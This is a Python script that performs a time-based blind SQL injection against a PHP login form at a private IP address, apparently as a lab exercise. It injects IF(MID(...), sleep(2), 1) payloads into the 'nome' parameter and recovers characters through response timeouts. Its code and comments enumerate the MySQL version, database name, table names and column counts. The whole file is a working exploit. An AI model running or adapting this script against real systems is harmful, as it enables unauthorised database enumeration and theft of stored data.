import requests;

'''	
  Things that we want to obtain
1 - MySql's Version and Server's Version *
2 - Database's name *
3 - Number of tables on the database *
4 - Tables names *
5 - Number of columns on each table
6 - Table columns names
7 - Get number of rows on each table
8 - Do a .log file with it
'''

url = "http://192.168.0.12/recebe.php"

char_list = ".1234567890etaoiunshrdlwmfcgypbkvjxqzETAOINSHRDLUWMFCGYPBKVJXQZ!@#$%*()_-=´`[]{}~^;,<>?/\|'\""

response = requests.get(url)

if response.status_code != requests.codes.ok:
	print("Error to connect")
	exit()

else:
	print("Starting the Sqli Blind at:", url)
	
	found = ""

	print("Starting fors")	
	for i in range(1, 20):
		for c in char_list: 
			try:
				# Gets mysql and server's versions
				#blindsql = "?nome=\' or IF(MID(@@version,1,%s)=\"%s\",sleep(2),1); -- &senha=0" % (str(i), (found + c))
				
				# Gets database's name
				#blindsql = "?nome=\' or IF(MID(database(),1,%s)=\"%s\", sleep(2),1); -- &senha=0" % (str(i), (found + c))
				 
				# Gets number of tables on the database
				# SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database();
				 
				# Gets number of columns of a table
				#SELECT COUNT(ordinal_position) FROM information_schema.columns WHERE table_name="usuarios";
				 
				# Get Table name, if the user has only one table
				blindsql = "?nome=\' or IF(MID((select table_name from information_schema.tables where table_schema=database()),1,%s)=\"%s\", sleep(2),1); -- &senha=0" % (str(i), (found + c))
					
				#SELECT MID((select nome from usuarios limit 1),1,3);
				response = requests.get(url+blindsql, timeout=2)
				
				#print(url+blindsql)
				#print(response)
			except requests.exceptions.Timeout:
				found += c
				print("Found:", found)
				break
